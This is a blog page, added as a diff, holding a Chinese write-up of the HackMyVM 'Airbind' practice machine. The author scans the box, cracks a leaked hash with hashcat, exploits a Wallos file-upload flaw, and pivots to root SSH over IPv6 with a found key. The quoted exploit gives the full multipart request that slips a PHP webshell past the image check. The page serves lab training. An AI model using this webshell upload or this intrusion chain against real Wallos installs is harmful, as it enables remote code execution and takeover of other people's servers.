@@ -1,0 +1,241 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Airbind | Yiyi</title><meta name="author" content="yiyi"><meta name="copyright" content="yiyi"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798┌──(root㉿kali">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Airbind">
+<meta property="og:url" content="https://xyaxxya.github.io/2024/12/17/HackMyVM%20Airbind/index.html">
+<meta property="og:site_name" content="Yiyi">
+<meta property="og:description" content="1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798┌──(root㉿kali">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://www.dmoe.cc/random.php?7190">
+<meta property="article:published_time" content="2024-12-17T08:42:02.000Z">
+<meta property="article:modified_time" content="2024-12-17T11:07:04.929Z">
+<meta property="article:author" content="yiyi">
+<meta property="article:tag" content="渗透">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://www.dmoe.cc/random.php?7190"><link rel="shortcut icon" href="https://s2.loli.net/2024/02/16/Ixe9Cyq2mFBj74T.jpg"><link rel="canonical" href="https://xyaxxya.github.io/2024/12/17/HackMyVM%20Airbind/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.12.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Airbind',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: false,
+  postUpdate: '2024-12-17 19:07:04'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 7.1.1"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://s2.loli.net/2024/02/16/Ixe9Cyq2mFBj74T.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">44</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">54</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="https://xyaxxya.github.io/"><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/tags"><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories"><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/archives"><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="https://xyaxxya.github.io/2024/02/16/关于我"><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://www.dmoe.cc/random.php?7190')"><nav id="nav"><span id="blog-info"><a href="/" title="Yiyi"><img class="site-icon" src="https://s2.loli.net/2024/02/16/Ixe9Cyq2mFBj74T.jpg"/><span class="site-name">Yiyi</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="https://xyaxxya.github.io/"><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/tags"><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories"><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/archives"><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="https://xyaxxya.github.io/2024/02/16/关于我"><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Airbind</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-12-17T08:42:02.000Z" title="发表于 2024-12-17 16:42:02">2024-12-17</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-12-17T11:07:04.929Z" title="更新于 2024-12-17 19:07:04">2024-12-17</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">1.3k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>7分钟</span></span><span class="post-meta-separator">|</span><span class="leancloud_visitors" id="/2024/12/17/HackMyVM%20Airbind/" data-flag-title="Airbind"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span class="leancloud-visitors-count"><i class="fa-solid fa-spinner fa-spin"></i></span></span><span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/2024/12/17/HackMyVM%20Airbind/#post-comment" itemprop="discussionUrl"><span class="valine-comment-count" data-xid="/2024/12/17/HackMyVM%20Airbind/" itemprop="commentCount"><i class="fa-solid fa-spinner fa-spin"></i></span></a></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># nmap -e eth1 -Pn -A -sV -T4 -p- 192.168.56.103</span></span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-17 03:35 EST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.56.103</span><br><span class="line">Host is up (0.00023s latency).</span><br><span class="line">Not shown: 65533 closed tcp ports (reset)</span><br><span class="line">PORT   STATE    SERVICE VERSION</span><br><span class="line">22/tcp filtered ssh</span><br><span class="line">80/tcp open     http    Apache httpd 2.4.57 ((Ubuntu))</span><br><span class="line">| http-cookie-flags: </span><br><span class="line">|   /: </span><br><span class="line">|     PHPSESSID: </span><br><span class="line">|_      httponly flag not <span class="built_in">set</span></span><br><span class="line">| http-title: Wallos - Subscription Tracker</span><br><span class="line">|_Requested resource was login.php</span><br><span class="line">|_http-server-header: Apache/2.4.57 (Ubuntu)</span><br><span class="line">MAC Address: 08:00:27:7F:90:98 (Oracle VirtualBox virtual NIC)</span><br><span class="line">No exact OS matches <span class="keyword">for</span> host (If you know what OS is running on it, see https://nmap.org/submit/ ).</span><br><span class="line">TCP/IP fingerprint:</span><br><span class="line">OS:SCAN(V=7.94SVN%E=4%D=12/17%OT=80%CT=1%CU=33274%PV=Y%DS=1%DC=D%G=Y%M=0800</span><br><span class="line">OS:27%TM=676137D5%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10D%TI=Z%CI=Z%</span><br><span class="line">OS:II=I%TS=A)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11N</span><br><span class="line">OS:W7%O5=M5B4ST11NW7%O6=M5B4ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE8</span><br><span class="line">OS:8%W6=FE88)ECN(R=Y%DF=Y%T=3F%W=FAF0%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=3F</span><br><span class="line">OS:%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=40%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R</span><br><span class="line">OS:=Y%DF=Y%T=40%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=3F%W=0%S=A%A=Z%F=</span><br><span class="line">OS:R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T</span><br><span class="line">OS:=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=</span><br><span class="line">OS:0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(</span><br><span class="line">OS:R=Y%DFI=N%T=40%CD=S)</span><br><span class="line"></span><br><span class="line">Network Distance: 1 hop</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.23 ms 192.168.56.103</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 32.04 seconds</span><br><span class="line">                                                                                                                                                                                    </span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># dirsearch -u 192.168.56.103      </span></span><br><span class="line">/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html</span><br><span class="line">  from pkg_resources import DistributionNotFound, VersionConflict</span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.4.3</span><br><span class="line"> (_||| _) (/_(_|| (_| )</span><br><span class="line"></span><br><span class="line">Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460</span><br><span class="line"></span><br><span class="line">Output File: /root/reports/_192.168.56.103/_24-12-17_03-36-06.txt</span><br><span class="line"></span><br><span class="line">Target: http://192.168.56.103/</span><br><span class="line"></span><br><span class="line">[03:36:06] Starting: </span><br><span class="line">[03:36:07] 200 -   72B  - /.dockerignore</span><br><span class="line">[03:36:07] 200 -  454B  - /.github/</span><br><span class="line">[03:36:07] 200 -  118B  - /.gitignore</span><br><span class="line">[03:36:07] 403 -  279B  - /.ht_wsr.txt</span><br><span class="line">[03:36:07] 403 -  279B  - /.htaccess.bak1</span><br><span class="line">[03:36:07] 403 -  279B  - /.htaccess.orig</span><br><span class="line">[03:36:07] 403 -  279B  - /.htaccess.sample</span><br><span class="line">[03:36:07] 403 -  279B  - /.htaccess_extra</span><br><span class="line">[03:36:07] 403 -  279B  - /.htaccess_sc</span><br><span class="line">[03:36:07] 403 -  279B  - /.htaccessBAK</span><br><span class="line">[03:36:07] 403 -  279B  - /.htaccess.save</span><br><span class="line">[03:36:07] 403 -  279B  - /.htaccessOLD</span><br><span class="line">[03:36:07] 403 -  279B  - /.htaccessOLD2</span><br><span class="line">[03:36:07] 403 -  279B  - /.htm</span><br><span class="line">[03:36:07] 403 -  279B  - /.htaccess_orig</span><br><span class="line">[03:36:07] 403 -  279B  - /.html</span><br><span class="line">[03:36:07] 403 -  279B  - /.htpasswd_test</span><br><span class="line">[03:36:07] 403 -  279B  - /.htpasswds</span><br><span class="line">[03:36:07] 403 -  279B  - /.httr-oauth</span><br><span class="line">[03:36:08] 403 -  279B  - /.php</span><br><span class="line">[03:36:15] 200 -    0B  - /auth.php</span><br><span class="line">[03:36:17] 200 -    7KB - /CHANGELOG.md</span><br><span class="line">[03:36:19] 301 -  313B  - /db  -&gt;  http://192.168.56.103/db/</span><br><span class="line">[03:36:19] 200 -  458B  - /db/</span><br><span class="line">[03:36:19] 200 -    2KB - /Dockerfile</span><br><span class="line">[03:36:22] 301 -  317B  - /images  -&gt;  http://192.168.56.103/images/</span><br><span class="line">[03:36:22] 200 -  614B  - /images/</span><br><span class="line">[03:36:22] 301 -  319B  - /includes  -&gt;  http://192.168.56.103/includes/</span><br><span class="line">[03:36:22] 200 -  699B  - /includes/</span><br><span class="line">[03:36:24] 301 -  315B  - /libs  -&gt;  http://192.168.56.103/libs/</span><br><span class="line">[03:36:24] 200 -  667B  - /login.php</span><br><span class="line">[03:36:25] 302 -    0B  - /logout.php  -&gt;  .</span><br><span class="line">[03:36:25] 200 -    3KB - /manifest.json</span><br><span class="line">[03:36:27] 200 -    1KB - /nginx.conf</span><br><span class="line">[03:36:31] 301 -  322B  - /screenshots  -&gt;  http://192.168.56.103/screenshots/</span><br><span class="line">[03:36:31] 301 -  318B  - /scripts  -&gt;  http://192.168.56.103/scripts/</span><br><span class="line">[03:36:31] 200 -  578B  - /scripts/</span><br><span class="line">[03:36:32] 403 -  279B  - /server-status</span><br><span class="line">[03:36:32] 403 -  279B  - /server-status/</span><br><span class="line">[03:36:34] 200 -    1KB - /startup.sh</span><br><span class="line">[03:36:34] 301 -  317B  - /styles  -&gt;  http://192.168.56.103/styles/</span><br><span class="line"></span><br><span class="line">Task Completed</span><br></pre></td></tr></table></figure>
+
+<p>信息泄露</p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20241217164333166.png" alt="image-20241217164333166"></p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20241217164339699.png" alt="image-20241217164339699"></p>
+<p>hashcat直接爆</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 3200 -a 0 hash.txt rockyou.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20241217164401141.png" alt="image-20241217164401141"></p>
+<p>直接登录</p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20241217164424271.png" alt="image-20241217164424271"></p>
+<p>第一件事就是找框架漏洞</p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20241217164505388.png" alt="image-20241217164505388"></p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20241217164543660.png" alt="image-20241217164543660"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Exploit Title: Wallos - File Upload RCE (Authenticated)</span></span><br><span class="line"><span class="comment"># Date: 2024-03-04</span></span><br><span class="line"><span class="comment"># Exploit Author: sml@lacashita.com</span></span><br><span class="line"><span class="comment"># Vendor Homepage: https://github.com/ellite/Wallos</span></span><br><span class="line"><span class="comment"># Software Link: https://github.com/ellite/Wallos</span></span><br><span class="line"><span class="comment"># Version: &lt; 1.11.2</span></span><br><span class="line"><span class="comment"># Tested on: Debian 12</span></span><br><span class="line"></span><br><span class="line">Wallos allows you to upload an image/logo when you create a new subscription.</span><br><span class="line">This can be bypassed to upload a malicious .php file.</span><br><span class="line"></span><br><span class="line">POC</span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">1) Log into the application.</span><br><span class="line">2) Go to <span class="string">&quot;New Subscription&quot;</span></span><br><span class="line">3) Upload Logo and choose your webshell .php</span><br><span class="line">4) Make the Request changing Content-Type to image/jpeg and adding <span class="string">&quot;GIF89a&quot;</span>, it should be like:</span><br><span class="line"></span><br><span class="line">--- SNIP -----------------</span><br><span class="line"></span><br><span class="line">POST /endpoints/subscription/add.php HTTP/1.1</span><br><span class="line"></span><br><span class="line">Host: 192.168.1.44</span><br><span class="line"></span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0</span><br><span class="line"></span><br><span class="line">Accept: */*</span><br><span class="line"></span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line"></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line"></span><br><span class="line">Referer: http://192.168.1.44/</span><br><span class="line"></span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------29251442139477260933920738324</span><br><span class="line"></span><br><span class="line">Origin: http://192.168.1.44</span><br><span class="line"></span><br><span class="line">Content-Length: 7220</span><br><span class="line"></span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">Cookie: theme=light; language=en; PHPSESSID=6a3e5adc1b74b0f1870bbfceb16cda4b; theme=light</span><br><span class="line"></span><br><span class="line">-----------------------------29251442139477260933920738324</span><br><span class="line"></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;name&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">test</span></span><br><span class="line"></span><br><span class="line">-----------------------------29251442139477260933920738324</span><br><span class="line"></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;logo&quot;</span>; filename=<span class="string">&quot;revshell.php&quot;</span></span><br><span class="line"></span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line">GIF89a;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">system(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">-----------------------------29251442139477260933920738324</span><br><span class="line"></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;logo-url&quot;</span></span><br><span class="line"></span><br><span class="line">----- SNIP -----</span><br><span class="line"></span><br><span class="line">5) You will get the response that your file was uploaded ok:</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;status&quot;</span>:<span class="string">&quot;Success&quot;</span>,<span class="string">&quot;message&quot;</span>:<span class="string">&quot;Subscription updated successfully&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">6) Your file will be located <span class="keyword">in</span>:</span><br><span class="line">http://VICTIM_IP/images/uploads/logos/XXXXXX-yourshell.php               </span><br></pre></td></tr></table></figure>
+
+<p>upload logo处直接传🐎</p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20241217164821040.png" alt="image-20241217164821040"></p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20241217164938649.png" alt="image-20241217164938649"></p>
+<p>蚁剑直接连</p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20241217165114864.png" alt="image-20241217165114864"></p>
+<p>发现可以，上传反弹shell的🐎</p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20241217171721596.png" alt="image-20241217171721596"></p>
+<p>成功接到shell</p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20241217171757225.png" alt="image-20241217171757225"></p>
+<p>6.。。</p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20241217171829478.png" alt="image-20241217171829478"></p>
+<p>得到user.txt</p>
+<p>塞个leapeas进去</p>
+<p>原来我们在容器里。。</p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20241217181540194.png" alt="image-20241217181540194"></p>
+<p>塞个fscan进去扫C段</p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20241217182604572.png" alt="image-20241217182604572"></p>
+<p>发现另一个ip，能ping通的</p>
+<p>发现一个私钥一个公钥</p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20241217183147693.png" alt="image-20241217183147693"></p>
+<p>拉到本地来可以解出公钥</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/yiyi/tmp]</span><br><span class="line">└─<span class="comment"># ssh-keygen -y -f ssh   </span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20241217183301517.png" alt="image-20241217183301517"></p>
+<p>但是在这里不能简单的拿私钥去登录，因为他的22端口的ipv4是被封锁的</p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20241217183505848.png" alt="image-20241217183505848"></p>
+<p>去查看靶机的ipv6</p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20241217183813401.png" alt="image-20241217183813401"></p>
+<p><strong>使用 <code>ping6</code> 与链路本地地址广播</strong></p>
+<p>通过向链路本地地址的 “所有节点多播组” 发送 ICMPv6 请求，可以发现同一链路上的所有 IPv6 设备。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping6 -I eth1 ff02::1</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20241217185953551.png" alt="image-20241217185953551"></p>
+<p>试一下就出来了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh root@fe80::a00:27ff:fe7f:9098%eth1 -i ssh </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20241217190617017.png" alt="image-20241217190617017"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://xyaxxya.github.io">yiyi</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://xyaxxya.github.io/2024/12/17/HackMyVM%20Airbind/">https://xyaxxya.github.io/2024/12/17/HackMyVM%20Airbind/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://xyaxxya.github.io" target="_blank">Yiyi</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%B8%97%E9%80%8F/">渗透</a></div><div class="post_share"><div class="social-share" data-image="https://www.dmoe.cc/random.php?7190" 